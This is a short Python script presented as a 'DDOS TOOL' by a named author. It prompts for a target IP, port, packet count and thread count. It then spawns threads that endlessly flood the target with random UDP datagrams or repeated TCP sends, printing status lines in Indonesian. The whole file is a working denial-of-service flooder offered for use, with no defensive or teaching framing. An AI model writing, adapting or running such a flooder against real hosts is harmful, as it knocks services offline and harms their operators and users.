import random
import socket
import threading
import os
import time

os.system("clear")
merah="TsumuX"
print("DDOS TOOL BY TsumuX\n\
Discord: TsumuX#1331\n\
Support: Termux")
time.sleep(2)

ip = str(input("Input target Ip: "))
port = int(input(" input target Port: "))
choice = str(input(" Gas?(y/n): "))
times = int(input(" Packets: "))
threads = int(input(" Threads: "))
def run():
  data = random._urandom(1024)
  i = random.choice(("[Send]","[Send]","[Send]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
      print(merah + i +" | mengirim ke",ip,":",port)
    except:
      print("[!] | mengirim ke",ip,":",port)

def run2():
  data = random._urandom(16)
  i = random.choice(("[*]","[!]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
      print(i +" HELLO THIS X")
    except:
      s.close()
      print("[*] Down")

for y in range(threads):
  if choice == 'y':
    th = threading.Thread(target = run)
    th.start()
  else:
    th = threading.Thread(target = run2)
    th.start()
